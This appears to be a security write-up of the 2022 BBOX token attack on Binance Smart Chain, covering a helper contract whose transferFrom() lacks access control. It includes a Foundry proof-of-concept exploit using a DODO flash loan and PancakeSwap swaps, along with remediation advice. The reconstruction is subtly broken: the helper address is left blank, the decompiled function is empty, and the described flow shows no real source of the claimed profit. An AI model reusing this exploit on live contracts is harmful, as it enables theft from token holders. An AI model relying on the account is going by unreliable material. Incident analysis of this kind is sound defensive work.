# BBOX — TransferBBOXHelp Unauthorized Token Transfer Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | BBOX Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **BBOX Token** | [0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c](https://bscscan.com/address/5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4](https://bscscan.com/address/0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4) |
| **Root Cause** | The `TransferBBOXHelp` helper contract's `transferFrom()` lacks caller authorization checks (`onlyAuthorized`), allowing anyone to transfer BBOX from arbitrary addresses |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/BBOX_exp.sol) |

---
## 1. Vulnerability Overview

The BBOX token ecosystem contained an auxiliary contract called `TransferBBOXHelp`. This helper was designed to assist with BBOX token transfers, but failed to verify caller authorization, allowing anyone to extract BBOX from arbitrary addresses. The attacker flash-loaned the entire WBNB balance from DODO, then swapped WBNB→BBOX to acquire a large amount of BBOX. After transferring this BBOX to the helper contract, the attacker called the helper's transfer function — which lacked authorization checks — to extract the BBOX back. Finally, 90% of the BBOX was swapped back to WBNB to repay the flash loan.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable TransferBBOXHelp - no authorization check
contract TransferBBOXHelp {
    IERC20 public bbox;

    // ❌ Anyone can call - no msg.sender validation
    // ❌ No allowance/approve check for the from address
    function transferFrom(address from, address to, uint256 amount) external {
        // ❌ require(authorized[msg.sender], "Not authorized"); missing
        // ❌ require(bbox.allowance(from, address(this)) >= amount, "No allowance"); missing
        bbox.transferFrom(from, to, amount);
    }
}

// ✅ Correct pattern - explicit authorization check
contract SafeTransferBBOXHelp {
    IERC20 public bbox;
    mapping(address => bool) public authorized;
    address public owner;

    modifier onlyAuthorized() {
        require(authorized[msg.sender], "Not authorized");
        _;
    }

    // ✅ Only authorized callers can transfer
    function transferFrom(address from, address to, uint256 amount)
        external onlyAuthorized
    {
        // ✅ Explicit allowance check
        require(bbox.allowance(from, address(this)) >= amount, "Insufficient allowance");
        bbox.transferFrom(from, to, amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**BBOX_decompiled.sol** — Entry point:
```solidity
// ❌ Root Cause: The `TransferBBOXHelp` helper contract's `transferFrom()` lacks caller authorization checks (`onlyAuthorized`), allowing anyone to transfer BBOX from arbitrary addresses
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan entire WBNB balance from DODO
    │
    ├─[2] Swap WBNB → BBOX (PancakeSwap, ~1,300 WBNB)
    │       Acquire large amount of BBOX
    │
    ├─[3] Transfer BBOX to TransferBBOXHelp contract
    │
    ├─[4] Call TransferBBOXHelp.transferFrom(helper, attacker, amount)
    │       ❌ No authorization check
    │       → Extract all BBOX held by helper
    │
    ├─[5] Swap 90% of BBOX → WBNB (PancakeSwap)
    │
    ├─[6] Repay DODO flash loan
    │
    └─[7] Net profit: WBNB arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBBOXHelp {
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract BBOXExploit is Test {
    IERC20    bbox    = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);
    IERC20    WBNB    = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter   router  = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IDODO     dodo    = IDODO(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    IBBOXHelp helper  = IBBOXHelp(/* TransferBBOXHelp address */);

    function setUp() public {
        vm.createSelectFork("bsc");
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB", WBNB.balanceOf(address(this)), 18);
        // Flash loan entire WBNB balance from DODO pool
        dodo.flashLoan(WBNB.balanceOf(address(dodo)), 0, address(this), "");
        emit log_named_decimal_uint("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] Swap WBNB → BBOX
        WBNB.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB); path[1] = address(bbox);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        uint256 bboxBal = bbox.balanceOf(address(this));

        // [Step 3] Transfer BBOX to helper contract
        bbox.transfer(address(helper), bboxBal);

        // [Step 4] Re-extract BBOX via helper's unauthorized transferFrom call
        // ⚡ No authorization check - can transfer BBOX from arbitrary addresses
        helper.transferFrom(address(helper), address(this), bboxBal);

        // [Step 5] Swap 90% of BBOX → WBNB (reverse swap)
        bbox.approve(address(router), type(uint256).max);
        path[0] = address(bbox); path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bbox.balanceOf(address(this)) * 90 / 100, 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        WBNB.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | TransferBBOXHelp helper contract unauthorized transferFrom() |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Access Control Vulnerability |
| **Attack Vector** | DODO flash loan → WBNB→BBOX swap → Transfer to helper → Unauthorized `transferFrom()` re-extraction → BBOX→WBNB |
| **Precondition** | `TransferBBOXHelp.transferFrom()` has no authorization check |
| **Impact** | WBNB arbitrage profit (magnitude unconfirmed) |

---
## 6. Remediation Recommendations

1. **Authorization List Management**: Add an `onlyAuthorized` modifier to `TransferBBOXHelp`'s `transferFrom()` and explicitly manage a list of authorized contracts.
2. **Allowance Validation**: Before the helper executes `transferFrom()`, verify `IERC20.allowance(from, address(this))` to allow the operation only when explicit approval exists.
3. **Helper Contract Minimization**: Handle transfer logic within the main token contract without a separate helper contract. If a helper is necessary, apply the principle of least privilege.

---
## 7. Lessons Learned

- **Security Risks of Helper Contracts**: Helper contracts that assist with token transfers require the same level of security as the main contract. If a helper can hold or transfer tokens, access control is mandatory.
- **Flash Loan + Unauthorized Transfer Combination**: The pattern of acquiring tokens via flash loan and re-extracting them through an unauthorized helper bypasses the protocol's intended flow.
- **Auditing Token Auxiliary Infrastructure**: All auxiliary contracts in the token ecosystem (helpers, distributors, bridges, etc.) must be audited together with the main token.